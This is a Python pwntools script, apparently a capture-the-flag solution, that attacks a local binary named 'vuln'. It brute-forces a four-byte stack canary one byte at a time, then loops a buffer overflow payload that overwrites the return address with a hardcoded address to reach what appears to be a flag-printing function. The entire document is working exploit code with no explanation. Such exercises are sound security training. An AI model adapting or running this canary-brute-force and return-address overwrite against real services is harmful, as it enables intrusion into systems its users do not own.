#!/usr/bin/env python

from pwn import *


initial = "A" * 32
canary = ""

for _ in range(0, 4):
    for i in range(0, 256):
        r = process("./vuln")
        r.recvuntil("> ")

        payload = initial + canary + chr(i)
        r.sendline(str(len(payload)))
        r.recvuntil("Input> ")
        r.send(payload)
        data = r.recv(1024)
        if "Stack Smashing Detected" not in data:
            canary += chr(i)
            break
    
        r.close()


print("Canary", canary)

data = "Ok... Now Where's the Flag?\n"
l = len(data)
while len(data) == l:
    r = process("./vuln")
    r.recvuntil("> ")
        
    payload = (
        initial +
        canary + 
        "A" * 16 +
        p32(0x565767ed)
    )
    r.sendline(str(len(payload)))
    r.recvuntil("Input> ")
    r.send(payload)

    data = r.recvall()
    r.close()

print(data)
